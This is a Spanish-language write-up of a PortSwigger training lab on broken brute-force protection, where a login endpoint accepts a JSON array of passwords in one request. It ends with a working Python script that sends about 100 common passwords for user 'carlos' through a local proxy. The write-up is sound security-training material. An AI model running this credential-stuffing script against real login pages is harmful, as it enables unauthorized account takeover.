---
title: "13 Broken brute-force protection, multiple credentials per request"
collection: publications
category: portswigger
permalink: publications/Authentication/13_Broken brute-force protection, multiple credentials per request
excerpt: 'Este laboratorio es vulnerable debido a un fallo lógico en su protección de fuerza bruta. Para resolverlo, fuerza bruta la contraseña de Carlos y accede a la página de su cuenta.'
date: 2024-12-06
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Broken brute-force protection, multiple credentials per request'
---

![logo]({{site.url}}/images/Authentication/authentication-lab-13/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Authentication/authentication-lab-13/descripcion.png)

## Objetivo del laboratorio

 Para resolverlo, fuerza bruta la contraseña de Carlos y accede a la página de su cuenta.

## Analisis

Realizamos un login con el usuario carlos y vemos que la solicitud se envia en formato `JSON`.

![JSON]({{site.url}}/images/Authentication/authentication-lab-13/json.png)

Probemos enviando un `Array` con posibles contraseñas, a ver si nos bloquea.

![Array]({{site.url}}/images/Authentication/authentication-lab-13/array.png)

## Formato JSON

Para que la lista sea valida debemos colocarle las comillas y separarlo por comas, para eso tenemos un script en python que nos va a hacer el trabajo.

![Script]({{site.url}}/images/Authentication/authentication-lab-13/script.png)

Cogemos ese arreglo y lo insertamos en la petición

![Respuesta]({{site.url}}/images/Authentication/authentication-lab-13/respuesta.png)

Cogemos la cookie que nos arrojo la copiamos y la pegamos en el navegador para poder loguearnos. Recargamos la pagina y vemos que hemos logueado el usuario `carlos`.

![Cookie]({{site.url}}/images/Authentication/authentication-lab-13/cookie.png)

# Codigo Python

```python
import requests
import sys
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    print("(+) Exploiting vulnerability....")
    login_url = url + "/login"
    payload = {"username": "carlos", "password": ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow","random"]}

    headers = {"Content-Type": "application/json"}

    r = s.post(login_url, json=payload, headers=headers, verify=False, proxies=proxies)

    if "Log out" in r.text:
        print("(+) Successfully accessed Carlos's account.")
    else:
        print("(-) Could not login to Carlos's account")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()
```